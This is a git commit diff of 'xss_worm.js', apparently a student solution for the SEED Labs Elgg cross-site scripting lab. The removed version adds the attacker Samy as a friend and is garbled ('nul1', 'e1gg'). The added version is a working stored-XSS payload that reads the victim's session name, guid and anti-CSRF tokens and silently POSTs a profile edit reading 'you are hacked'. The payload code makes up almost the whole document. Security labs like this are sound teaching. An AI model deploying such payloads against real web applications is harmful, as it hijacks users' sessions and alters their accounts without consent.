89b34a3b300937880560091bfb692c41f73ca8e1
z-summer-zhw <76779464+z-summer-zhw@users.noreply.github.com>
2024-09-19 20:52:23 +0800

    Update xss_worm.js

--- xss_worm.js
+++ xss_worm.js
@@ -1,9 +1,24 @@
-<script type="text/javascript"> window.onload = function (){
-var Ajax = nul1;
-var ts = "&__e1gg_ts=" + elgg.security.token.__e1gg_ts; // ①
-var token = "&__e1gg_token=" + elgg.security.token.__e1gg_token; // ②
-// Construct the HTTP request to add Samy as a friend.
-var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
-// Create and send Ajax request to add friend Ajax = new XMLHttpRequest();
-Ajax.open("GET"，sendurl,true); Ajax.send();
+<script type="text/javascript">
+window.onload = function(){
+//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+//and Security Token __elgg_token
+var userName="&name="+elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+//Construct the content of your url.
+var content=userName + guid+ts+token+"&description = you are hacked"; //FILL IN
+var samyGuid=59; //FILL IN
+var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
+if(elgg.session.user.guid!=samyGuid) ➀
+{
+//Create and send Ajax request to modify profile
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST", sendurl, true);
+Ajax.setRequestHeader("Content-Type",
+"application/x-www-form-urlencoded");
+Ajax.send(content);
+}
+}
 </script>
